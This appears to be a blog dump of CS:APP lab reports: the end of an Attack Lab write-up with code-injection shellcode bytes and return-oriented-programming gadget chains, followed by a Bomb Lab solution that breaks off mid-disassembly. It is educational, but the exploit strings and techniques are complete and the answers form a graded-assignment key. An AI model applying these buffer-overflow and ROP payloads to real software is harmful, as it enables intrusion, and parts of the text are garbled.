movq %0x59b997fa, %rdipushq %0x4017ecretq To obtain the raw machine code bytes corresponding to this assembly, the source is assembled and disassembled using gcc and objdump. gcc -c exploit.sobjdump -d exploit.o The final exploit string is constructed by placing this instruction byte sequence at the beginning of the buffer, padding the remaining buffer space up to 40 bytes with zeros, and then overwriting the saved return address on the stack. The return address is set to 0x5561dc78, the buffer’s start address, so that the ret instruction in getbuf transfers control to the injected code. The complete byte string is: 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 Certainly. The exploit code may be positioned at any valid location within the buffer area. The following configuration represents an alternative valid solution: 00 00 00 00 00 00 00 0048 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0080 dc 61 55 00 00 00 00 Level 3The key distinction is that Level 2 injects and executes code before any subsequent function calls overwrite the stack, whereas Level 3 must position its injected string in a region of the stack that will not be overwritten by the subsequent local buffer (cbuf[110]) allocated within the hexmatch function. The cookie value must be converted into its hexadecimal string representation: 35 39 62 39 39 37 66 61 (corresponding to 59b997fa). After getbuf returns, its stack memory is effectively recycled and reused by touch3 and hexmatch. Due to the random offset used within hexmatch, the only consistently safe area for storing data is within the test function’s preserved stack region. Inspection of the stack pointer at the entry to touch3 reveals %rsp = 0x5561dca0. Therefore, a safe location for the cookie string is at 0x5561dca8, just above this address. (gdb) b getbuf(gdb) p/x %rsp%1 = 0x5561dca0 Verification using gdb confirms the safety of this address: ./hex2raw exploit.txt level.raw(gdb) b touch3(gdb) b hexmatch(gdb) r -q level.raw(gdb) p/x %rsp%1 = 0x5561dca8(gdb) c(gdb) p/x %rsp%2 = 0x5561dc98 Stack Layout Analysis: High address│ │├──────────────────────────────┤ 0x5561dcd0│ Other parts of test frame │├──────────────────────────────┤ 0x5561dcc8│ Return address ││ (overwritten to 0x5561dca0) │ ← exploit control flow├──────────────────────────────┤ 0x5561dcc0│ Possibly free │├──────────────────────────────┤ 0x5561dcb8│ Possibly free │├──────────────────────────────┤ 0x5561dcb0│ Potential injection point │├──────────────────────────────┤ 0x5561dca8│ rsp position at touch3 entry │ ← rsp value you observed├──────────────────────────────┤ 0x5561dca0│ touch3 saved rbx │ ← written by touch3 push %rbx├──────────────────────────────┤ 0x5561dc98│ hexmatch return address │ ← written by call hexmatch├──────────────────────────────┤ 0x5561dc90 │ hexmatch saved r12 │ ← written by push %r12 ├──────────────────────────────┤ 0x5561dc88 │ hexmatch saved rbp │ ← written by push %rbp ├──────────────────────────────┤ 0x5561dc80 │ hexmatch saved rbx │ ← written by push %rbx ├──────────────────────────────┤ 0x5561dc78 │ Original getbuf buffer area │ ├──────────────────────────────┤ 0x5561dc00 │ Start of hexmatchs cbuf[110]│ ← new stack top after add -128! │ ... │ │ cbuf[0]...cbuf[109] │ ├──────────────────────────────┤ │ Remaining hexmatch frame │ Low Address Address 0x5561dca8 remains safe because touch3‘s push %rbx first decrements %rsp by 8 and then stores the value of %rbx at 0x5561dca0, leaving 0x5561dca8 untouched. The injected code should therefore set up the argument and transfer control: movq %0x5561dca8, %rdipushq %0x4018faret Using the same construction method as Level 2, the final exploit string becomes (0x5561dc78 %\\sim% 0x5561dca8) : 48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 0035 39 62 39 39 37 66 61 Placing the cookie string at 0x5561dcb0 is also feasible, requiring additional padding: 48 c7 c7 b0 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 0000 00 00 00 00 00 00 0035 39 62 39 39 37 66 61 Part 2 Return-Oriented ProgrammingROP is an exploitation technique that builds attack payloads by chaining existing, ret-terminated instruction snippets (gadgets). Gadgets are located via byte-aligned scanning of executable memory. The attacker controls the stack to sequence these gadgets, with each ret instruction transferring control to the next gadget in the chain. In the assignment example, the byte sequence 48 89 c7 c3 is extracted from the instruction c7 07 d4 48 89 c7 movl %0xc78948d4, (%rdi). When execution begins at the 48 byte, this sequence is interpreted as the instruction movq %rax, %rdi. This is possible because x86-64 instructions are variable-length and lack alignment boundaries, allowing the same byte stream to be decoded as different instructions depending on the starting offset. Level 2 movq %0x59b997fa, %rdipushq %0x4017ecretq This is the asnwer in Part 2. The straightforward approach would be to find a gadget that directly sets the value 0x59b997fa into the %rdi register. However, searching through the gadget farm reveals that no such gadget exists in the available code. Since a direct movq instruction with the immediate value is unavailable, an indirect approach is employed: Place the value on the stack The cookie value 0x59b997fa is included in the exploit string. Use popq %rax Extract the value from the stack into a register. Transfer to %rdi Move the value from %rax to %rdi using movq %rax, %rdi. Return to touch2 The popq %rax instruction corresponds to the byte 58. Examining the disassembled code reveals the following memory content 4019a7: 8d 87 51 73 58 90. This sequence contains 58 followed by 90 (a nop instruction), forming a valid popq %rax; nop gadget. The execution should start at address 0x4019ab to align the instruction boundaries correctly. The movq %rax, %rdi instruction corresponds to the bytes 48 89 c7. The disassembly shows 4019a0: 8d 87 48 89 c7 c3. Starting execution at address 0x4019a3 causes the sequence 48 89 c7 c3 to be interpreted as movq %rax, %rdi; ret. The complete exploit string is structured as follows: 00 00 00 00 00 00 00 00 # Padding for the buffer (40 bytes)00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00 # Address of popq %rax gadget (0x4019ab)fa 97 b9 59 00 00 00 00 # Cookie value to be popped into %raxa3 19 40 00 00 00 00 00 # Address of movq %rax, %rdi gadget (0x4019a3)ec 17 40 00 00 00 00 00 # Address of touch2 function (0x4017ec) Level 3movq %0x5561dca8, %rdipushq %0x4018faret This represents the ideal code injection solution from Part 2. However, due to the implementation of two defensive techniques (stack randomization and non-executable stack), the exploit must instead utilize the current stack pointer combined with a calculated offset. The fundamental approach is outlined below: movq %rsp, %rax # Capture current stack pointerpopq %rbx # Load offset value from stackaddq %rbx, %rax # Calculate string address: rsp + offsetmovq %rax, %rdi # Pass address as first argument to touch3 Gadget Identification and Chain Construction movq %rsp, %rax (Byte pattern 48 89 e0) Located at: 401a03: 8d 87 41 48 89 e0 Execution starts at 0x401a06 to align the instruction. movq %rax, %rdi (Byte pattern 48 89 c7) Only popq %rax is available for loading data, not popq %rbx. Therefore, %rax is used as the primary data carrier. Located at: 4019c3: c7 07 48 89 c7 90 Execution starts at 0x4019c5. popq %rax (Byte pattern 58) Located at: 4019a7: 8d 87 51 73 58 90 Execution starts at 0x4019ab. The offset value popped into %rax must have its upper 32 bits as zeros to be compatible with subsequent 32-bit operations. Since a direct movq %rax, %rsi gadget is unavailable, and movl %eax, %edi (89 c7 at 0x4019c6) cannot be constructed subsequently, an alternative register transfer chain using 32-bit moves is constructed: movl %eax, %edx (Byte pattern 89 c2) Located at: 4019db: b8 5c 89 c2 90 Execution starts at 0x4019dd. movl %edx, %ecx (Byte pattern 89 d1) Located at: 401a68: b8 89 d1 08 db Execution starts at 0x401a6a. The following orb %bl, %bl instruction (08 db) has no net effect as it performs a bitwise OR of %bl with itself. movl %ecx, %esi (Byte pattern 89 ce) Located at: 401a11: 8d 87 89 ce 90 90 Execution starts at 0x401a13. lea (%rdi,%rsi,1),%rax This gadget performs the crucial address addition: rax = rdi + rsi. Located at: 0x4019d6, i.e. add_xy function. movq %rax, %rdi (Reuse gadget from step 2) Finalizes the setup of the first argument for touch3. The offset value of 0x48 is calculated as the difference between the string’s position in the exploit buffer (0x78) and the value stored in %rdi (0x30). The constructed exploit string, incorporating padding, gadget addresses, the offset value, and the cookie string, is as follows: 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00 # gadget1: movq %rsp, %rax @0x401a06c5 19 40 00 00 00 00 00 # gadget2: movq %rax, %rdi @0x4019c5ab 19 40 00 00 00 00 00 # gadget3: popq %rax @0x4019ab48 00 00 00 00 00 00 00 # offset value (0x48)dd 19 40 00 00 00 00 00 # gadget4: movl %eax, %edx @0x4019dd6a 1a 40 00 00 00 00 00 # gadget5: movl %edx, %ecx @0x401a6a13 1a 40 00 00 00 00 00 # gadget6: movl %ecx, %esi @0x401a13d6 19 40 00 00 00 00 00 # gadget7: lea (%rdi,%rsi,1),%rax @0x4019d6c5 19 40 00 00 00 00 00 # gadget8: movq %rax, %rdi @0x4019c5fa 18 40 00 00 00 00 00 # Address of touch3 @0x4018fa35 39 62 39 39 37 66 61 # Cookie string: 59b997fa (hex ASCII)","categories":["Academy"]},{"title":"CMU CS:APP Bomb Lab","path":"/2025/12/28/Bomb Lab/","content":"Bomb Labhttps://sunchaoyi923.github.io/file/Bomb%20Lab.pdf CS:APP Bomb Lab ReportName SUNCHAOYI First use objdump -d bomb bomb.asm to get its assmebly. Phase_10000000000400ee0 phase_1: 400ee0:\t48 83 ec 08 sub $0x8,%rsp 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 strings_not_equal 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 phase_1+0x17 400ef2:\te8 43 05 00 00 call 40143a explode_bomb 400ef7:\t48 83 c4 08 add $0x8,%rsp 400efb:\tc3 ret mov $0x402400,%esi 0x402400 contains the password string. Use GDB’s x/s command to display the string at that memory address: gdb bomb(gdb) x/s 0x402400 The Phase_1 answer is Border relations with Canada have never been better. Phase_20000000000400efc phase_2: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp 400f02:\t48 89 e6 mov %rsp,%rsi 400f05:\te8 52 05 00 00 call 40145c read_six_numbers 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) 400f0e:\t74 20 je 400f30 phase_2+0x34 400f10:\te8 25 05 00 00 call 40143a explode_bomb 400f15:\teb 19 jmp 400f30 phase_2+0x34 400f17:\t8b 43 fc mov -0x4(%rbx),%eax 400f1a:\t01 c0 add %eax,%eax 400f1c:\t39 03 cmp %eax,(%rbx) 400f1e:\t74 05 je 400f25 phase_2+0x29 400f20:\te8 15 05 00 00 call 40143a explode_bomb 400f25:\t48 83 c3 04 add $0x4,%rbx 400f29:\t48 39 eb cmp %rbp,%rbx 400f2c:\t75 e9 jne 400f17 phase_2+0x1b 400f2e:\teb 0c jmp 400f3c phase_2+0x40 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a:\teb db jmp 400f17 phase_2+0x1b 400f3c:\t48 83 c4 28 add $0x28,%rsp 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret cmpl $0x1,(%rsp) je 400f30 phase_2+0x34 If the value at the top of the stack is 1, jump to address 0x400f30. lea 0x4(%rsp),%rbx lea 0x18(%rsp),%rbp jmp 400f17 phase_2+0x1b %rbx is set to point to the second element of the array (numbers[1]). %rbp is set to point just past the last element (numbers[6]), since 0x18 $= 6 \\times 4 = 24$ bytes. Execution then jumps to the loop body at 400f17. 400f17 $\\sim$ 400f2c (loop body) Load the previous element (numbers[i-1]) into %eax, double it, and compare the result with the current element (numbers[i]). Only if numbers[i] == 2 * numbers[i-1] does the loop continue; otherwise the bomb explodes. After processing all six numbers, control jumps to 400f3c (loop exit). The required sequence for Phase 2 is therefore 1 2 4 8 16 32. Phase_30000000000400f43 phase_3: 400f43:\t48 83 ec 18 sub $0x18,%rsp 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi 400f56:\tb8 00 00 00 00 mov $0x0,%eax 400f5b:\te8 90 fc ff ff call 400bf0 __isoc99_sscanf@plt 400f60:\t83 f8 01 cmp $0x1,%eax 400f63:\t7f 05 jg 400f6a phase_3+0x27 400f65:\te8 d0 04 00 00 call 40143a explode_bomb 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f:\t77 3c ja 400fad phase_3+0x6a 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax 400f81:\teb 3b jmp 400fbe phase_3+0x7b 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe phase_3+0x7b 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe phase_3+0x7b 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe phase_3+0x7b 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe phase_3+0x7b 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe phase_3+0x7b 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe phase_3+0x7b 400fad:\te8 88 04 00 00 call 40143a explode_bomb 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe phase_3+0x7b 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2:\t74 05 je 400fc9 phase_3+0x86 400fc4:\te8 71 04 00 00 call 40143a explode_bomb 400fc9:\t48 83 c4 18 add $0x18,%rsp 400fcd:\tc3 ret mov $0x4025cf,%esi cmp $0x1,%eax jg 400f6a phase_3+0x27 Using (gdb) x/s 0x4025cf shows %d %d, meaning the input must be two integers separated by a space. If sscanf returns a value $\\le 1$, the bomb explodes. lea 0xc(%rsp),%rcx lea 0x8(%rsp),%rdx cmpl $0x7,0x8(%rsp) ja 400fad phase_3+0x6a %rdx points to where the first integer is stored (0x8(%rsp)), and %rcx points to the second integer (0xc(%rsp)). The first integer must be $\\le 7$, otherwise the bomb explodes. 400f7c $\\sim$ 400fbe (switch body) Each case loads a specific immediate value into %eax, then jumps to a common check at 400fbe. There, the loaded value is compared with the second integer. Only if they are equal does the phase pass. From the jump‑table cases we obtain the valid pairs: 0 207 / 1 311 / 2 707 / 3 256 / 4 389 / 5 206 / 6 682 / 7 327 Any one of these pairs is a correct solution. Phase_40000000000400fce func4: 400fce:\t48 83 ec 08 sub $0x8,%rsp 400fd2:\t89 d0 mov %edx,%eax 400fd4:\t29 f0 sub %esi,%eax 400fd6:\t89 c1 mov %eax,%ecx 400fd8:\tc1 e9 1f shr $0x1f,%ecx 400fdb:\t01 c8 add %ecx,%eax 400fdd:\td1 f8 sar $1,%eax 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2:\t39 f9 cmp %edi,%ecx 400fe4:\t7e 0c jle 400ff2 func4+0x24 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx 400fe9:\te8 e0 ff ff ff call 400fce func4 400fee:\t01 c0 add %eax,%eax 400ff0:\teb 15 jmp 401007 func4+0x39 400ff2:\tb8 00 00 00 00 mov $0x0,%eax 400ff7:\t39 f9 cmp %edi,%ecx 400ff9:\t7d 0c jge 401007 func4+0x39 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi 400ffe:\te8 cb ff ff ff call 400fce func4 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007:\t48 83 c4 08 add $0x8,%rsp 40100b:\tc3 ret000000000040100c phase_4: 40100c:\t48 83 ec 18 sub $0x18,%rsp 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi 40101f:\tb8 00 00 00 00 mov $0x0,%eax 401024:\te8 c7 fb ff ff call 400bf0 __isoc99_sscanf@plt 401029:\t83 f8 02 cmp $0x2,%eax 40102c:\t75 07 jne 401035 phase_4+0x29 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033:\t76 05 jbe 40103a phase_4+0x2e 401035:\te8 00 04 00 00 call 40143a explode_bomb 40103a:\tba 0e 00 00 00 mov $0xe,%edx 40103f:\tbe 00 00 00 00 mov $0x0,%esi 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi 401048:\te8 81 ff ff ff call 400fce func4 40104d:\t85 c0 test %eax,%eax 40104f:\t75 07 jne 401058 phase_4+0x4c 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056:\t74 05 je 40105d phase_4+0x51 401058:\te8 dd 03 00 00 call 40143a explode_bomb 40105d:\t48 83 c4 18 add $0x18,%rsp 401061:\tc3 ret mov $0x4025cf,%esi cmp $0x2,%eax jne 401035 phase_4+0x29 Using (gdb) x/s 0x4025cf shows %d %d, meaning the input must be two integers separated by a space. If sscanf returns a value $ eq 2$, the bomb explodes. lea 0xc(%rsp),%rcx lea 0x8(%rsp),%rdx cmpl $0xe,0x8(%rsp) cmpl $0x0,0xc(%rsp) %rdx points to where the first integer is stored (0x8(%rsp)), and %rcx points to the second integer (0xc(%rsp)). The first integer must be $\\le 14$, the second integer must exactly $0$, otherwise the bomb explodes. mov $0xe,%edx mov $0x0,%esi mov 0x8(%rsp),%edi call 400fce cmpl $0x0,0xc(%rsp)` Three arguments are passed to func4, i.e. func4(first_number,0,14). The function must return 0, otherwise the bomb explodes. func4 assembly translated to C language int func4(int target, int low, int high) int mid = low + (high - low) / 2; //since low = 0,high = 14 so the sign bit = 0, which can be ignored. if (mid = target) if (mid = target) return 0; // i.e. target can be found else low = mid + 1; return 2 * func4 (target,low,high) + 1; else high = mid - 1; return 2 * func4 (target,low,high); The function returns $0$ only when first_number lies on the “mid‑point path” of the binary search.The valid values for the first number are $0,1,3,7$. Combining all conditions, the correct answers for Phase_4 are any of the following pairs: 0 0 / 1 0 / 3 0 / 7 0 Phase_50000000000401062 phase_5: 401062:\t53 push %rbx 401063:\t48 83 ec 20 sub $0x20,%rsp 401067:\t48 89 fb mov %rdi,%rbx 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071:\t00 00 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) 401078:\t31 c0 xor %eax,%eax 40107a:\te8 9c 02 00 00 call 40131b string_length 40107f:\t83 f8 06 cmp $0x6,%eax 401082:\t74 4e je 4010d2 phase_5+0x70 401084:\te8 b1 03 00 00 call 40143a explode_bomb 401089:\teb 47 jmp 4010d2 phase_5+0x70 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b phase_5+0x29 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 call 401338 strings_not_equal 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 phase_5+0x77 4010c6:\te8 6f 03 00 00 call 40143a explode_bomb 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 phase_5+0x77 4010d2:\tb8 00 00 00 00 mov $0x0,%eax 4010d7:\teb b2 jmp 40108b phase_5+0x29 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5:\t00 00 4010e7:\t74 05 je 4010ee phase_5+0x8c 4010e9:\te8 42 fa ff ff call 400b30 __stack_chk_fail@plt 4010ee:\t48 83 c4 20 add $0x20,%rsp 4010f2:\t5b pop %rbx 4010f3:\tc3 ret call 40131b string_length cmp $0x6,%eax The input must be a string of exactly six characters. 40108b $\\sim$ 4010ac (loop body) For each character input[i]: Take its low‑order 4 bits (input[i] 0xF) as an index ($0 \\sim 15$). Use that index to look up a character from a table stored at address 0x4024b0. Store the looked‑up character into an output buffer on the stack. Examining the table (gdb) x/s 0x4024b0, get maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?. The relevant part is the first 16 characters: maduiersnfotvbyl. The converted six‑character string must equal the string at 0x40245e. Checking (gdb) x/s 0x40245e, get flyers. Hence the condition for each position $i$ is: table[input[i] 0xF] == flyers[i] Therefore, the answer is ionefg. Phase_600000000004010f4 phase_6: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp 401100:\t49 89 e5 mov %rsp,%r13 401103:\t48 89 e6 mov %rsp,%rsi 401106:\te8 51 03 00 00 call 40145c read_six_numbers 40110b:\t49 89 e6 mov %rsp,%r14 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d 401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 phase_6+0x34 401123:\te8 12 03 00 00 call 40143a explode_bomb 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 phase_6+0x5f 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 phase_6+0x51 401140:\te8 f5 02 00 00 call 40143a explode_bomb 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 phase_6+0x41 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 phase_6+0x20 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 phase_6+0x6c 40116f:\tbe 00 00 00 00 mov $0x0,%esi 401174:\teb 21 jmp 401197 phase_6+0xa3 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 phase_6+0x82 401181:\teb 05 jmp 401188 phase_6+0x94 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab phase_6+0xb7 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 phase_6+0x8f 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx 4011a9:\teb cb jmp 401176 phase_6+0x82 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 phase_6+0xde 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd phase_6+0xc9 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee phase_6+0xfa 4011e9:\te8 4c 02 00 00 call 40143a explode_bomb 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df phase_6+0xeb 4011f7:\t48 83 c4 50 add $0x50,%rsp 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret 4010f4 $\\sim$ 40110e Calls read_six_numbers to read six integers into an array on the stack. 401114 $\\sim$ 401151 The double loop checks 1 = number[i] = 6 (subtracting 1 converts the range check into an unsigned comparison with 5) and ensures all six numbers are distinct. 401153 $\\sim$ 40116d Each number is transformed as number[i] = 7 - number[i] 40116f $\\sim$ 4011a9 The starting address 0x6032d0 is examined. Inspection via (gdb) x/128x 0x6032d0 reveals a linked-list structure. 0x6032d0 node1: 0x4c 0x01 0x00 0x00 0x01 0x00 0x00 0x000x6032d8 node1+8: 0xe0 0x32 0x60 0x00 0x00 0x00 0x00 0x000x6032e0 node2: 0xa8 0x00 0x00 0x00 0x02 0x00 0x00 0x000x6032e8 node2+8: 0xf0 0x32 0x60 0x00 0x00 0x00 0x00 0x000x6032f0 node3: 0x9c 0x03 0x00 0x00 0x03 0x00 0x00 0x000x6032f8 node3+8: 0x00 0x33 0x60 0x00 0x00 0x00 0x00 0x000x603300 node4: 0xb3 0x02 0x00 0x00 0x04 0x00 0x00 0x000x603308 node4+8: 0x10 0x33 0x60 0x00 0x00 0x00 0x00 0x000x603310 node5: 0xdd 0x01 0x00 0x00 0x05 0x00 0x00 0x000x603318 node5+8: 0x20 0x33 0x60 0x00 0x00 0x00 0x00 0x000x603320 node6: 0xbb 0x01 0x00 0x00 0x06 0x00 0x00 0x000x603328 node6+8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 Each node occupies 16 bits (value (4 bits), id (4 bits) address (8 bits)) organized in Little-Endian format. This structure clearly defines a singly linked list. node $i$ value address next pointer 1 0x14c 0x6032d0 0x6032e0 2 0xa8 0x6032e0 0x6032f0 3 0x39c 0x6032f0 0x603300 4 0x2b3 0x603300 0x603310 5 0x1dd 0x603310 0x603320 6 0x1bb 0x603320 NULL For each transformed number[i], if number[i] = 1, the head node is used directly; otherwise, a loop traverses the list to select the number[i]-th node. 4011ab $\\sim$ 4011d9 The code rebuilds the linked list according to the order specified by the transformed number[i] values. Register roles %rbx Address of the new head node (read from node_ptrs[0] on the stack) %rcx Address of the current node being processed %rdx Address of the next node (read from the pointer array on the stack) %rax Points to the storage location of the next node pointer in the stack array Instructions mov %rbx,%rcx Set the current node to the head node mov (%rax),%rdx Read the address of the next node from the stack mov %rdx,0x8(%rcx) Make the current node point to the next node 4011da $\\sim$ 4011f5 cmp %eax,(%rbx) This ensures the final list is sorted in non‑increasing order by the integer values stored in the nodes. The original values in the list are $[\\texttt{0x14c},\\texttt{0xa8},\\texttt{0x39c},\\texttt{0x2b3},\\texttt{0x1dd},\\texttt{0x1bb}]$. When sorted in descending order by value, the corresponding node IDs are $[3,4,5,6,1,2]$. This ID order represents the transformed input. Since the transformation is num[i] = 7 - original[i], we reverse it to obtain the original input 4,3,2,1,6,5. secret_phase00000000004015c4 phase_defused: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 num_input_strings 4015df:\t75 5e jne 40163f phase_defused+0x7b 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi 4015fa:\te8 f1 f5 ff ff call 400bf0 __isoc99_sscanf@plt 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 phase_defused+0x71 401604:\tbe 22 26 40 00 mov $0x402622,%esi 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e:\te8 25 fd ff ff call 401338 strings_not_equal 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 phase_defused+0x71 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 puts@plt 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 puts@plt 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff 